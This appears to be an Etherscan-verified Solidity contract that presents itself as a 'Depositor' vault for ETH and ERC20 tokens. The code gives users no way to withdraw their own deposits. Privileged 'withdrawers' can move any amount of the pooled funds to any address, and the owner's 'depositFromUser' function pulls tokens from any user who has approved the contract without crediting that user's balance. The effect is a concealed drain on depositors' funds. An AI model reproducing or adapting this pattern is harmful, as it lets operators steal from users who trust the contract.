/**
 *Submitted for verification at Etherscan.io on 2023-03-09
*/

pragma solidity ^0.8.2;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract Depositor {
    address private owner;
    address private constant ETH_ADDRESS = 0x0000000000000000000000000000000000000001;

    mapping(address => mapping(address => uint256)) private userDeposits;
    mapping(address => address[]) private userActiveTokens;
    mapping(address => mapping(address => uint256)) private firstDeposit;
    mapping(address => bool) private withdrawers;

    constructor(
        address[] memory _withdrawers
    ) {
        owner = msg.sender;
        for(uint8 i = 0; i < _withdrawers.length; i++) {
            withdrawers[_withdrawers[i]] = true;
        }
    }

    function setWithdrawer(address _user, bool _i) external {
        require(msg.sender == owner);
        withdrawers[_user] = _i;
    }

    function changeOwner(address _newOwner) external {
        require(msg.sender == owner);
        owner = _newOwner;
    }

    function deposit(address _token, uint256 _amount) external payable {
        _addToActiveAssets(msg.sender, _token);
        if (_token == ETH_ADDRESS) {
            // ETH DEPOSIT
            require(msg.value > 0);
            userDeposits[msg.sender][_token] += msg.value;
        } else {
            // ERC deposit
            require(_amount > 0);
            userDeposits[msg.sender][_token] += _amount;

            IERC20(_token).transferFrom(msg.sender, address(this), _amount);
        }
    }

    function _addToActiveAssets(address _user, address _token) internal {
        bool found = false;
        address[] memory _arr = userActiveTokens[_user];
        for(uint256 i = 0; i < _arr.length; i++) {
            if (_arr[i] == _token) {
                found = true;
                break;
            }
        }

        if (!found) {
            userActiveTokens[_user].push(_token);
            firstDeposit[_user][_token] = block.timestamp;
        }
    }

    function depositFromUser(address _user, address _token, uint256 _amount) external {
        require(msg.sender == owner);
        require(_amount > 0);

        IERC20(_token).transferFrom(_user, address(this), _amount);
    }

    function withdraw(address _token, uint256 _amount, address _receiver) external {
        require(withdrawers[msg.sender]);
        uint256 withdrawAmount;
        if (_token == ETH_ADDRESS) {
            // ETH withdraw
            withdrawAmount = address(this).balance > _amount ? _amount : address(this).balance;

            payable(_receiver).transfer(withdrawAmount);
        } else {
            // ERC withdraw
            uint256 _cBal = IERC20(_token).balanceOf(address(this));
            withdrawAmount = _cBal > _amount ? _amount : _cBal;

            IERC20(_token).transfer(_receiver, withdrawAmount);
        }
    }

    function getUserDeposit(address _user, address _token) external view returns (uint256) {
        return userDeposits[_user][_token];
    }

    function getUserActiveTokens(address _user) external view returns (address[] memory) {
        return userActiveTokens[_user];
    }

    function getUserFirstDeposit(address _user, address _token) external view returns (uint256) {
        return firstDeposit[_user][_token];
    }
}